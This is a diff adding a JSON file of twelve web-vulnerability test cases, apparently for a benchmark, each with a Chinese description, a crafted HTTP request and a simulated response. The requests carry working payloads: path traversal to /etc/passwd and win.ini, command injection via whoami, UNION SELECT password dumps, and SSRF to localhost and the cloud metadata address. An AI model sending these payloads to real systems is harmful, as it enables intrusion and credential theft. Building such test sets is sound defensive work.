@@ -1,0 +1,101 @@
+{
+  "version": 1,
+  "cases": [
+    {
+      "case_id": "traversal-linux-query",
+      "category": "traversal",
+      "base": "下载接口存在 Linux 路径遍历，可读取系统文件。",
+      "poc": "通过 path 参数提交 ../../etc/passwd。",
+      "request": {"method": "GET", "target": "/download?path=../../etc/passwd"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/plain"}, "body": "root:x:0:0:root:/root:/bin/sh"}
+    },
+    {
+      "case_id": "traversal-windows-query",
+      "category": "traversal",
+      "base": "文档读取接口未校验 Windows 文件路径。",
+      "poc": "通过 path 参数读取 C:\\Windows\\win.ini。",
+      "request": {"method": "GET", "target": "/DocumentByPath?path=C%3A%5CWindows%5Cwin.ini"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/plain"}, "body": "; for 16-bit app support\n[fonts]\n[extensions]"}
+    },
+    {
+      "case_id": "traversal-double-encoded",
+      "category": "traversal",
+      "base": "文件预览接口会二次 URL 解码，存在路径遍历。",
+      "poc": "filename 使用双重编码的 ../etc/passwd。",
+      "request": {"method": "GET", "target": "/preview?filename=%252e%252e%252fetc%252fpasswd"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/plain"}, "body": "root:x:0:0:root:/root:/bin/sh"}
+    },
+    {
+      "case_id": "command-form",
+      "category": "command_injection",
+      "base": "诊断接口将表单 cmd 参数传入 shell。",
+      "poc": "提交 cmd=whoami 并观察命令输出。",
+      "request": {"method": "POST", "target": "/api/diagnose", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "id=123&cmd=whoami"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/plain"}, "body": "service-user"}
+    },
+    {
+      "case_id": "command-json-rce",
+      "category": "json_rce",
+      "base": "任务执行 API 未限制 JSON cmd 字段。",
+      "poc": "JSON 正文提交 whoami 命令。",
+      "request": {"method": "POST", "target": "/api/tasks/run", "headers": {"Content-Type": "application/json"}, "body": "{\"cmd\":\"whoami\",\"id\":\"123\"}"},
+      "response": {"status": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"exitCode\":0,\"stdout\":\"service-user\"}"}
+    },
+    {
+      "case_id": "sqli-query",
+      "category": "sqli",
+      "base": "商品查询接口将 id 参数拼接进 SQL。",
+      "poc": "id 参数使用 UNION SELECT 获取额外行。",
+      "request": {"method": "GET", "target": "/api/items?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users"},
+      "response": {"status": 200, "headers": {"Content-Type": "application/json"}, "body": "[{\"username\":\"admin\",\"password\":\"hash\"}]"}
+    },
+    {
+      "case_id": "sqli-form",
+      "category": "sqli",
+      "base": "报表接口将 query 表单字段拼接进 SQL。",
+      "poc": "query 字段包含 UNION SELECT。",
+      "request": {"method": "POST", "target": "/reports/search", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "scope=current&query=1+UNION+SELECT+username%2Cpassword+FROM+users"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/csv"}, "body": "username,password\nadmin,hash"}
+    },
+    {
+      "case_id": "ssrf-json",
+      "category": "ssrf",
+      "base": "抓取 API 可访问本机管理服务。",
+      "poc": "JSON url 指向 http://127.0.0.1:8080/admin。",
+      "request": {"method": "POST", "target": "/api/fetch", "headers": {"Content-Type": "application/json"}, "body": "{\"url\":\"http://127.0.0.1:8080/admin\",\"mode\":\"raw\"}"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/html"}, "body": "<title>Internal Admin</title>"}
+    },
+    {
+      "case_id": "ssrf-form",
+      "category": "ssrf",
+      "base": "URL 预览接口可访问云元数据地址。",
+      "poc": "表单 url 指向 169.254.169.254 元数据服务。",
+      "request": {"method": "POST", "target": "/url/preview", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&format=text"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/plain"}, "body": "instance-id\nlocal-hostname\niam"}
+    },
+    {
+      "case_id": "xml-command",
+      "category": "xml",
+      "base": "XML 运维接口执行 cmd 节点中的命令。",
+      "poc": "cmd 节点提交 whoami。",
+      "request": {"method": "POST", "target": "/ops/execute", "headers": {"Content-Type": "application/xml"}, "body": "<request><id>123</id><cmd>whoami</cmd></request>"},
+      "response": {"status": 200, "headers": {"Content-Type": "application/xml"}, "body": "<result><exitCode>0</exitCode><stdout>service-user</stdout></result>"}
+    },
+    {
+      "case_id": "xml-traversal-attribute",
+      "category": "xml",
+      "base": "XML 文件读取接口信任 path 属性。",
+      "poc": "read 节点 path 属性提交 ../../etc/passwd。",
+      "request": {"method": "POST", "target": "/xml/read", "headers": {"Content-Type": "text/xml"}, "body": "<read path=\"../../etc/passwd\"><trace>0</trace></read>"},
+      "response": {"status": 200, "headers": {"Content-Type": "text/plain"}, "body": "root:x:0:0:root:/root:/bin/sh"}
+    },
+    {
+      "case_id": "multipart-command",
+      "category": "multipart",
+      "base": "导入接口会执行 multipart cmd 字段。",
+      "poc": "multipart/form-data 中的 cmd 字段提交 whoami。",
+      "request": {"method": "POST", "target": "/api/import", "headers": {"Content-Type": "multipart/form-data; boundary=bench-boundary"}, "body": "--bench-boundary\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n123\r\n--bench-boundary\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nwhoami\r\n--bench-boundary--\r\n"},
+      "response": {"status": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"imported\":true,\"output\":\"service-user\"}"}
+    }
+  ]
+}
